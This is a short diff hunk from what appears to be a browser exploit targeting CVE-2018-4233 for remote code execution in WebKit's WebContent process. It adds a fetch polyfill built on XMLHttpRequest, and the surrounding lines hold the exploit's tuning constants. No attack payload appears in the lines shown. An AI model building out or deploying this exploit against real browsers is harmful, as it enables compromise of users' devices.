@@ -4,6 +4,33 @@
  * This exploit uses CVE-2018-4233 (by saelo) to get RCE in WebContent.
  */
 
+// ghetto polyfill
+if(!window.fetch)
+{
+    window.fetch = function(url)
+    {
+        return new Promise((resolve, reject) =>
+        {
+            var req = new XMLHttpRequest();
+            req.open("GET", url);
+            req.responseType = 'blob';
+            req.addEventListener('load', function()
+            {
+                if(req.responseType != 'blob')
+                {
+                    throw 'y u no blob';
+                }
+                resolve(new Response(req.response));
+            });
+            req.addEventListener('error', function(ev)
+            {
+                reject(ev);
+            });
+            req.send();
+        });
+    };
+}
+
 ITERS = 10000
 ALLOCS = 1000
 
